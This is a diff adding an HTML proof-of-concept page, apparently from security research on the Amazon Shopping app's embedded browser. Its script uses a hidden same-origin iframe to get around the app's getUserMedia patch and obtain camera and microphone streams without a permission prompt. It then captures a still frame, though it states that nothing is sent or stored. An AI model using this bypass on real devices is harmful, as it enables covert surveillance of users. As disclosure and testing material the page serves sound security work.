@@ -1,0 +1,106 @@
+<!doctype html>
+<!-- 0xnet research page for finding b99d3fe3 (lead e6ce41d6), step E8. To be loaded ONLY on our own test emulator.
+     Inside the Amazon Shopping app's embedded browser it shows a live camera preview and a microphone level meter,
+     and prints the size and SHA-256 of one still frame to show that the page holds the pixels.
+     It sends nothing anywhere and stores nothing. Every track is stopped after 40 seconds.
+     The emulator camera is a generated test pattern and its microphone is silent. -->
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>0xnet research page (b99d3fe3 E8)</title>
+<body style="font:14px/1.35 sans-serif;margin:10px">
+<h3 style="margin:4px 0">0xnet research page: b99d3fe3 E8</h3>
+<div style="display:flex;gap:10px;align-items:flex-start">
+  <div>
+    <div>live camera preview</div>
+    <video id="v" autoplay muted playsinline style="width:210px;height:280px;background:#222;border:3px solid #c00"></video>
+  </div>
+  <div>
+    <div>microphone level</div>
+    <canvas id="m" width="70" height="250" style="border:3px solid #06c;background:#eee"></canvas>
+    <div id="mv" style="font:bold 15px monospace">-</div>
+  </div>
+</div>
+<pre id="out" style="white-space:pre-wrap;word-break:break-all;margin:6px 0"></pre>
+<script>
+(function () {
+  var out = document.getElementById('out'), v = document.getElementById('v');
+  var mc = document.getElementById('m').getContext('2d'), mv = document.getElementById('mv');
+  var streams = [], analysed = 0;
+  function log(k, val) { out.textContent += k + ': ' + val + '\n'; }
+  function describe(s) { return s.getTracks().map(function (t) { return t.kind + ' "' + t.label + '" ' + t.readyState; }).join(' | '); }
+  function hex(buf) { return Array.prototype.map.call(new Uint8Array(buf), function (b) { return ('0' + b.toString(16)).slice(-2); }).join(''); }
+  log('marker', '0xnet-acctsw-E8');
+  log('location', location.href);
+  log('userAgent', navigator.userAgent);
+  log('_cordovaNative present', typeof window._cordovaNative);
+  try { log('web view engine (client hints)', navigator.userAgentData ? JSON.stringify(navigator.userAgentData.brands) : 'no userAgentData'); } catch (e) { log('web view engine', 'n/a'); }
+  log('page clock', new Date().toISOString());
+  setTimeout(function () {
+    // A. in-page control: the standard top-level call that the app's script patch is meant to neuter
+    try {
+      var pA = navigator.mediaDevices && navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      if (pA && pA.then) pA.then(function (s) { log('A top-level getUserMedia', 'STREAM: ' + describe(s)); s.getTracks().forEach(function (t) { t.stop(); }); },
+                                 function (e) { log('A top-level getUserMedia', 'refused: ' + e.name); });
+      else log('A top-level getUserMedia', 'blocked by the app patch (returned ' + pA + ')');
+    } catch (e) { log('A top-level getUserMedia', 'threw ' + e); }
+    // B. a fresh same-origin frame has its own, unpatched MediaDevices object
+    var f = document.createElement('iframe'); f.style.display = 'none'; document.body.appendChild(f);
+    var md = f.contentWindow.navigator.mediaDevices;
+    md.getUserMedia({ video: true }).then(function (s) {
+      streams.push(s); v.srcObject = s;
+      log('B1 frame getUserMedia video', 'STREAM without a prompt: ' + describe(s));
+      v.onloadedmetadata = function () { log('B1 video size', v.videoWidth + 'x' + v.videoHeight); };
+    }, function (e) { log('B1 frame getUserMedia video', 'refused: ' + e.name + ' ' + (e.message || '')); });
+    md.getUserMedia({ audio: true }).then(function (s) {
+      streams.push(s);
+      log('B2 frame getUserMedia audio', 'STREAM without a prompt: ' + describe(s));
+      try {
+        var AC = window.AudioContext || window.webkitAudioContext, ac = new AC();
+        var an = ac.createAnalyser(); an.fftSize = 1024; ac.createMediaStreamSource(s).connect(an);
+        var buf = new Uint8Array(an.fftSize);
+        var timer = setInterval(function () {
+          an.getByteTimeDomainData(buf); var peak = 0;
+          for (var i = 0; i < buf.length; i++) { var d = Math.abs(buf[i] - 128); if (d > peak) peak = d; }
+          analysed++;
+          mc.clearRect(0, 0, 70, 250); mc.fillStyle = '#0a0'; var h = Math.round(peak / 128 * 244); mc.fillRect(5, 247 - h, 60, h);
+          mc.fillStyle = '#06c'; mc.fillRect(5, 247 - (analysed % 245), 60, 2);
+          mv.textContent = 'peak ' + peak + '/128\nreads ' + analysed + '\nt=' + ac.currentTime.toFixed(1) + 's';
+        }, 100);
+        window.__stopMeter = function () { clearInterval(timer); try { ac.close(); } catch (e) {} };
+      } catch (e) { log('microphone meter', 'failed ' + e); }
+    }, function (e) { log('B2 frame getUserMedia audio', 'refused: ' + e.name + ' ' + (e.message || '')); });
+    // C. the legacy entry point
+    try {
+      var legacy = navigator.webkitGetUserMedia || navigator.getUserMedia;
+      if (legacy) legacy.call(navigator, { audio: true },
+        function (s) { streams.push(s); log('C legacy getUserMedia', 'STREAM without a prompt: ' + describe(s)); },
+        function (e) { log('C legacy getUserMedia', 'refused: ' + (e && e.name)); });
+      else log('C legacy getUserMedia', 'not present');
+    } catch (e) { log('C legacy getUserMedia', 'threw ' + e); }
+    // the page holds the pixels: encode one still frame in memory and print its size and SHA-256. Nothing is sent.
+    setTimeout(function () {
+      try {
+        if (!v.videoWidth) { log('still frame', 'no video'); return; }
+        var c = document.createElement('canvas'); c.width = 160; c.height = Math.round(160 * v.videoHeight / v.videoWidth);
+        c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+        c.toBlob(function (b) {
+          var fr = new FileReader();
+          fr.onload = function () {
+            var done = function (d) { log('one still frame in page memory', c.width + 'x' + c.height + ' jpeg, ' + b.size + ' bytes, sha256 ' + d + ' (not sent, not stored)'); };
+            if (window.crypto && crypto.subtle) crypto.subtle.digest('SHA-256', fr.result).then(function (h) { done(hex(h)); }, function () { done('n/a'); });
+            else done('n/a');
+          };
+          fr.readAsArrayBuffer(b);
+        }, 'image/jpeg', 0.5);
+      } catch (e) { log('still frame', 'failed ' + e); }
+    }, 6000);
+    setTimeout(function () {
+      streams.forEach(function (s) { s.getTracks().forEach(function (t) { t.stop(); }); });
+      if (window.__stopMeter) window.__stopMeter();
+      v.srcObject = null; log('all tracks stopped', new Date().toISOString());
+    }, 40000);
+  }, 1500);
+})();
+</script>
+</body>
